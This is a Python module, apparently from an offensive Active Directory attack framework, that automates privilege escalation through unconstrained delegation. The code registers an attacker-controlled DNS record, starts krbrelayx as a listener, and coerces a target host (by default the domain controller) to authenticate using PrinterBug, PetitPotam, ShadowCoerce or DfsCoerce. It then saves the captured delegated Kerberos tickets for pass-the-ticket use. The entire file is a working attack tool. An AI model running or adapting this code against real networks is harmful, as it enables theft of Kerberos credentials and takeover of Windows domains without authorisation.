import asyncio
import os
import random
import shlex
import string
from pathlib import Path

import dns.exception
import dns.resolver

from module import BaseModule
from tool import Tool
from modules.coercion_dfscoerce import DfsCoerce
from modules.coercion_petitpotam import PetitPotam
from modules.coercion_printerbug import PrinterBug
from modules.coercion_shadowcoerce import ShadowCoerce

EMPTY_LM_HASH = "aad3b435b51404eeaad3b435b51404ee"


class UnconstrainedDelegation(BaseModule):
    path = "delegation/unconstrained"
    description = "Privilege Escalation via Unconstrained Delegation."
    info = """To find the correct options to use, run the 'enum/delegation' module first.

Requirements:
  - Control over an account configured for unconstrained delegation.
  - Ability to create a DNS record in AD-integrated DNS.
  - Ability to coerce authentication from a target host (commonly a DC).

This module:
  1. Adds a temporary DNS record pointing to the attacker.
  2. Starts krbrelayx in unconstrained delegation mode.
  3. Triggers coercion to the temporary hostname.
  4. Captures delegated TGTs as ccache files in the logs directory.
    """
    options = {
        "dc_ip": {
            "default": "",
            "description": "DC IP or host address. If blank, the domain name will be used.",
            "required": False,
        },
        "listen_ip": {
            "default": "",
            "description": "Listener (attacker) IP address.",
            "required": True,
        },
        "coercer": {
            "default": "printerbug",
            "description": "Coercion technique (petitpotam, printerbug, shadowcoerce, dfscoerce).",
            "required": True,
        },
        "coercion_target": {
            "default": "",
            "description": "Target host to coerce. If empty, the current DC hostname is used.",
            "required": False,
        },
        "dns_record": {
            "default": "",
            "description": "Temporary DNS record label to create. If empty, a random value is used.",
            "required": False,
        },
        "relay_target": {
            "default": "",
            "description": "Optional relay target for krbrelayx attack mode (e.g., ldap://dc.domain.local).",
            "required": False,
        },
        "krbsalt": {
            "default": "",
            "description": "Optional Kerberos salt for krbrelayx when using plaintext password.",
            "required": False,
        },
        "target_domain": {
            "default": "",
            "description": "Target domain (FQDN) (If empty, auth domain will be used.)",
            "required": False,
        },
        "domain": {
            "default": "",
            "description": "Auth: Domain name (FQDN)",
            "required": True,
        },
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {
            "default": "",
            "description": "Auth: Password or NT Hash (for NTLM auth only)",
            "required": False,
        },
        "auth": {
            "default": "ntlm",
            "description": "Auth: Type (ntlm, krb)",
            "required": True,
        },
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)
        self.coercers = {
            "petitpotam": PetitPotam,
            "printerbug": PrinterBug,
            "shadowcoerce": ShadowCoerce,
            "dfscoerce": DfsCoerce,
        }

    def _random_dns_label(self) -> str:
        suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"ud{suffix}"

    def _sanitize_dns_label(self, value: str) -> str:
        label = "".join(ch for ch in value.lower() if ch.isalnum() or ch == "-").strip(
            "-"
        )
        if not label:
            return self._random_dns_label()
        return label[:63]

    def _default_krbsalt(self) -> str:
        username = self.opts.username.split("\\")[-1].split("@")[0]

        if username.endswith("$"):
            hostname = username[:-1].lower()
            return (
                f"{self.opts.domain.upper()}host{hostname}.{self.opts.domain.lower()}"
            )

        return f"{self.opts.domain.upper()}{username}"

    def _krbrelayx_secret_args(self) -> list[str]:
        password = self.opts.password.strip()
        if self.is_nt_hash(password):
            nthash = password.strip(":")
            return ["-hashes", f"{EMPTY_LM_HASH}:{nthash}"]

        secret_args = ["-p", password]
        salt = self.opts.krbsalt.strip() if self.opts.krbsalt else ""
        if not salt:
            salt = self._default_krbsalt()
        if salt:
            secret_args += ["-s", salt]

        return secret_args

    async def _wait_for_dns_record(
        self, dns_record: str, timeout_sec: int = 180
    ) -> bool:
        fqdn = f"{dns_record}.{self.opts.domain}"
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [self.opts.dc_ip]

        waited = 0
        while waited < timeout_sec:
            try:
                records = resolver.resolve(fqdn, "A")
                ips = [record.to_text() for record in records]
                if self.opts.listen_ip in ips:
                    self.pane_b.write(f"{fqdn} -> {', '.join(ips)}")
                    return True
                self.pane_b.write(
                    f"{fqdn} -> {', '.join(ips)} (waiting for {self.opts.listen_ip})"
                )
            except dns.resolver.NoAnswer:
                self.pane_b.write(f"{fqdn} -> No answer")
            except dns.resolver.NXDOMAIN:
                self.pane_b.write(f"{fqdn} -> NXDOMAIN")
            except dns.resolver.NoNameservers:
                self.pane_b.write(f"{fqdn} -> No nameservers available")
            except dns.resolver.Timeout:
                self.pane_b.write(f"{fqdn} -> DNS timeout")
            except dns.exception.DNSException as err:
                self.pane_b.write(f"{fqdn} -> DNS error: {err}")

            await asyncio.sleep(5)
            waited += 5

        self.pane_b.write("[red]DNS propagation did not complete in time.[/red]")
        return False

    def _build_krbrelayx_command(self) -> str:

        command_parts = [
            "timeout",
            "25",
            "../tools/krbrelayx",
            "-ip",
            self.opts.listen_ip,
            "-dc-ip",
            self.opts.dc_ip,
            "-l",
            self.logs_dir,
            "-f",
            "ccache",
        ]

        if self.opts.relay_target:
            command_parts += ["-t", self.opts.relay_target]

        command_parts += self._krbrelayx_secret_args()
        return shlex.join(command_parts)

    async def _run_krbrelayx(self) -> None:
        command = self._build_krbrelayx_command()
        async for line in self.run_command(command, self.pane_b):
            if "Saving ticket in " in line:
                line = f"[green]{line}[/green]"
            elif (
                "Could not find the correct encryption key" in line
                or "cannot extract ticket" in line
            ):
                line = f"[red]{line}[/red]"
            self.pane_b.write(line)

    def _build_coercer(self):
        coercer_name = self.opts.coercer.lower()
        coercer_cls = self.coercers.get(coercer_name)
        if coercer_cls is None:
            self.pane_a.write(
                f"[yellow][!] Unknown coercer `{self.opts.coercer}`, defaulting to `printerbug`.[/yellow]"
            )
            coercer_cls = PrinterBug

        coercer = coercer_cls(self.registry, self.job_manager)
        coercer.pane_a = self.pane_a
        coercer.pane_b = self.pane_b
        coercer.pane_c = self.pane_c
        coercer.opts.domain = self.opts.domain
        coercer.opts.username = self.opts.username
        coercer.opts.password = self.opts.password
        coercer.opts.auth = "ntlm"
        coercer.opts.dc_ip = self.opts.dc_ip

        return coercer

    async def _run_coercer(self, dns_record: str, coercion_target: str) -> None:
        coercer = self._build_coercer()
        await coercer._run(dns_record, coercion_target, sleep=1, pane=self.pane_c)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        self.opts.dc_ip = self.adutils.get_dc_ip(self.opts.dc_ip, self.opts.domain)
        self.opts.dc_hostname = self.adutils.get_dc_hostname(
            self.opts.dc_ip, self.opts.domain
        )

        if self.opts.target_domain == "":
            self.opts.target_domain = self.opts.domain

        if self.opts.password == "":
            self.pane_a.write(
                "[red][!] `password` must contain the unconstrained delegation account secret (password or NT hash).[/red]"
            )
            return

        dns_record = self._sanitize_dns_label(
            self.opts.dns_record or self._random_dns_label()
        )
        coercion_target = self.opts.coercion_target or self.opts.dc_hostname

        tool = Tool(self)
        if not tool.set_auth(
            auth="ntlm",
            domain=self.opts.domain,
            username=self.opts.username,
            password=self.opts.password,
        ):
            return

        tool.title("Register temporary DNS record for coercion")
        if not await tool.dnstool(
            [
                "-r",
                dns_record,
                "-d",
                self.opts.listen_ip,
                "--action",
                "add",
                self.opts.dc_hostname,
                "--tcp",
            ]
        ):
            return

        existing_tickets = set(Path(self.logs_dir).glob("*.ccache"))

        try:
            tool.title("Wait for DNS propagation")
            if not await self._wait_for_dns_record(dns_record):
                return

            tool.title("Start krbrelayx and trigger coercion")
            await asyncio.gather(
                self._run_krbrelayx(),
                self._run_coercer(dns_record, coercion_target),
            )
        finally:
            tool.title("Delete temporary DNS record")
            if tool.set_auth(
                auth="ntlm",
                domain=self.opts.domain,
                username=self.opts.username,
                password=self.opts.password,
            ):
                await tool.dnstool(
                    [
                        "-r",
                        dns_record,
                        "-d",
                        self.opts.listen_ip,
                        "--action",
                        "remove",
                        self.opts.dc_hostname,
                        "--tcp",
                    ]
                )

        new_tickets = sorted(
            ticket
            for ticket in Path(self.logs_dir).glob("*.ccache")
            if ticket not in existing_tickets
        )
        if not new_tickets:
            self.pane_b.write(
                "[red]No new Kerberos tickets were captured. Verify coercion target reachability and krbrelayx secret material (hash/password+salt).[/red]"
            )
            return

        self.pane_b.write("[green bold]Captured delegated ticket(s):[/green bold]")
        for ticket in new_tickets:
            self.pane_b.write(f"[green]  - {ticket.name}[/green]")

        self.pane_b.write(
            "[green bold]Attack successful. Captured tickets can be used with `ptt <ccache_file>` in modules or directly by Kerberos-capable tooling.[/green bold]"
        )
